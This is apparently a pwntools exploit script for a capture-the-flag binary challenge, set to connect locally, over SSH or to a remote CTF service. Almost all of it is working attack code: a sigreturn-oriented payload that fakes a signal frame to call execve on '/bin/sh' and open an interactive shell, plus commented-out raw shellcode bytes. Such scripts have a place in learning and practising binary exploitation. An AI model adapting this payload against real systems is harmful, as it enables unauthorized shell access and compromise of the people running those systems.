import argparse
from pwn import *
context.terminal = ['tmux', 'splitw', '-h']

# cmdline argument - how to connect to binary
parser = argparse.ArgumentParser()
parser.add_argument("--local", help="Run exploit locally", action="store_true")
parser.add_argument("--attach", help="Run exploit locally and attach debugger", action="store_true")
parser.add_argument("--remote", help="Run exploit on remote service", action="store_true")
parser.add_argument("--ssh", help="Run exploit on SSH server", action="store_true")
args = parser.parse_args()

# GDB commands
gdb_cmd = [
	"b *0x400153",
	"c"
]

# Binary names
bin_fname = './challenge'
libc_fname = ''

# Remote
IP = 'university.opentoallctf.com'
PORT = 30003

# SSH
URL = ''
username = ''
password = ''
bin_abs_path = ''

# Create ELF objects
e = ELF(bin_fname)
libc = ELF(libc_fname) if libc_fname else None
x64 = e.bits != 32

# Command line args
# e.g. arg1 = cyclic_find('ahaa') * 'a' + '\xbd\x86\x04\x08' + 'a' * 4 + p32(next(e.search('/bin/sh')))
arg1 = ''
proc_args = [bin_fname, arg1]

if args.remote:
	p = remote(IP, PORT)
elif args.local or args.attach:
	p = process(proc_args, env={"LD_PRELOAD" : libc_fname}) if libc_fname else process(proc_args)
	if args.attach:
		gdb.attach(p, gdbscript="\n".join(gdb_cmd))
elif args.ssh:
	s = ssh(host=URL, user=username, password=password)
	s.set_working_directory(bin_abs_path)
	p = s.process(proc_args)
else:
	p = gdb.debug(proc_args, gdbscript="\n".join(gdb_cmd), env={"LD_PRELOAD" : libc_fname}) if libc_fname else gdb.debug(proc_args, gdbscript="\n".join(gdb_cmd))
	p.recvline() # Read "Remote debugging from 127.0.0.1" string

"""
	Exploit

	Examples:
	func_offset = libc.symbols['puts'] 	# Offset in libc
	puts_addr = p32(e.got['puts'])
	main = e.symbols['main']
	addr_string = next(e.search('/bin/cat flag.txt'))
"""

binsh = 0x400155
syscall = 0x400153

buf = 'a' * 16
buf += p64(15)
buf += (13 * 8) * '\x00' # Sigreturn frame filler
buf += p64(binsh) # rdi = &'/bin/sh'
buf += (4 * 8) * '\x00'
buf += p64(59)  # rax = 59 (execve)
buf += (2 * 8) * '\x00'
buf += p64(syscall) # rip = syscall
buf += p64(0x216) # Eflags
buf += p64(0x00000033) # cs
buf += (9 * 8) * '\x00'

p.recvuntil('Give me some data:')
p.sendline(buf)
# p.sendline(cyclic(100, n=8 if x64 else 4))
# buf = (cyclic_find('iaaa', n=8 if x64 else 4)) * 'a'
# x = '2f 62 69 6e 2f 73 68 00 2f 62 69 6e 2f 73 68 00 18 00 00 00 00 00 00 00 b8 3b 00 00 00 48 89 f7 0f 05'
# payload = bytearray([int(y, 16) for y in x.split(' ')])

# p.recvuntil('Give me some data:\n')
# p.send(payload)

# Send buffer and interact
p.interactive()
